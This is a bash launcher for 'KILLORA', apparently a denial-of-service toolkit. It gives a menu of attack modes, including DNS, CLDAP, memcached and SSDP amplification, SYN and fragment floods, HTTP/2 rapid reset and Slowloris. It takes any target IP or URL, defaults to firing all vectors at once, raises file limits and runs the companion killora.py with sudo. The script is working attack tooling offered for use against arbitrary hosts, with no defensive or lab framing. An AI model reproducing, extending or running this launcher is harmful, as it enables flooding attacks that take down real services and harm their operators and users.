#!/usr/bin/env bash
# KILLORA by BrokenCodeZ
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PY="$DIR/killora.py"
C1='\033[1;36m'; C2='\033[1;35m'; C3='\033[1;33m'
C4='\033[1;32m'; CR='\033[1;31m'; DM='\033[2m'; N='\033[0m'

banner() {
  clear
  printf "${C2}"
  cat <<'EOF'
   __ __ _ _ _      ___  ___  ___  _   _
  |  |  | | | | ___| . |  _| . | | | |
  |    <| | | ||___| | | | | | | |_| |
  |_|\__|_____|    |___|_| |___|_____|
EOF
  printf "${N}"
  printf "        ${C1}K I L L O R A${N}  ${DM}by BrokenCodeZ${N}\n"
  printf "  ${DM}6x AMP . FRAG . SYN . TLS . H2-RESET . POST${N}\n"
  printf "  ${DM}------------------------------------------------${N}\n\n"
}

need() { command -v "$1" >/dev/null 2>&1; }

boot() {
  need python3 || { apt-get update -qq && apt-get install -y python3; } 2>/dev/null
  need python3 || { printf "${CR}python3 missing${N}\n"; exit 1; }
  [ -f "$PY" ] || { printf "${CR}killora.py missing${N}\n"; exit 1; }
  python3 -c 'import h2' 2>/dev/null || \
    pip3 install --quiet --break-system-packages h2 2>/dev/null || \
    python3 -m pip install --quiet --break-system-packages h2 2>/dev/null
}

banner
boot

printf "  ${CR}[ ENTER ]${N} = MAX  ${DM}sab vectors ek saath${N}\n\n"
printf "  ${C3}[1]${N} MAX        ${C3}[2]${N} DNS AMP    ${C3}[3]${N} CLDAP AMP\n"
printf "  ${C3}[4]${N} MEMCACHED  ${C3}[5]${N} SSDP AMP   ${C3}[6]${N} CHARGEN\n"
printf "  ${C3}[7]${N} RIPv1      ${C3}[8]${N} SYN+opts   ${C3}[9]${N} FRAG\n"
printf "  ${C3}[10]${N} TLS Hello ${C3}[11]${N} H2 RESET   ${C3}[12]${N} H2 POST\n"
printf "  ${C3}[13]${N} HTTP      ${C3}[14]${N} UDP        ${C3}[15]${N} ICMP\n"
printf "  ${C3}[16]${N} Slowloris ${C3}[17]${N} Checker\n"
printf "  ${CR}[0]${N} Exit\n\n"

read -rp "  ${C1}Killora >${N} " OPT
case "$OPT" in
  ""|1) MODE=max;;
  2) MODE=dnsamp;; 3) MODE=cldapamp;; 4) MODE=memcacheamp;;
  5) MODE=ssdpamp;; 6) MODE=chargenamp;; 7) MODE=ripamp;;
  8) MODE=syn;; 9) MODE=frag;; 10) MODE=tlshello;;
  11) MODE=h2reset;; 12) MODE=h2;; 13) MODE=http;;
  14) MODE=udp;; 15) MODE=icmp;; 16) MODE=slow;; 17) MODE=check;;
  0) exit 0;; *) MODE=max;;
esac

banner
while :; do
  read -rp "  Target (IP / host / URL): " RAW
  [ -n "$RAW" ] && break
done
RAW="${RAW#http://}"; RAW="${RAW#https://}"; RAW="${RAW%%/*}"
HOST="$RAW"

if [ "$MODE" = "check" ]; then
  exec python3 "$PY" check "$HOST" 0 0 5 1
fi

CPU=$(nproc 2>/dev/null || echo 2)
[ "$CPU" -gt 8 ] && CPU=8

if [ "$MODE" = "max" ]; then
  PORT=443; COUNT=0; DUR="${KILLORA_DUR:-120}"; PROCS="$CPU"
  printf "\n  ${C4}%s${N} -> ${CR}MAX${N}  ${DM}%d procs, %ss${N}\n" "$HOST" "$PROCS" "$DUR"
else
  DEF=80
  case "$MODE" in
    tlshello|h2reset|h2|max) DEF=443;;
    dnsamp) DEF=53;;
    slow|http) DEF=80;;
  esac
  read -rp "  Port [$DEF]: " PORT; PORT="${PORT:-$DEF}"
  read -rp "  Count (0=unlimited): " COUNT; COUNT="${COUNT:-0}"
  read -rp "  Duration sec [60]: " DUR; DUR="${DUR:-60}"
  read -rp "  Procs [$CPU]: " PROCS; PROCS="${PROCS:-$CPU}"
fi

ulimit -n 1048576 2>/dev/null
printf "\n  ${C3}ENTER = launch${N}"
read -r _

if [ "$EUID" -ne 0 ]; then
  exec sudo -E python3 "$PY" "$MODE" "$HOST" "$PORT" "$COUNT" "$DUR" "$PROCS"
fi
exec python3 "$PY" "$MODE" "$HOST" "$PORT" "$COUNT" "$DUR" "$PROCS"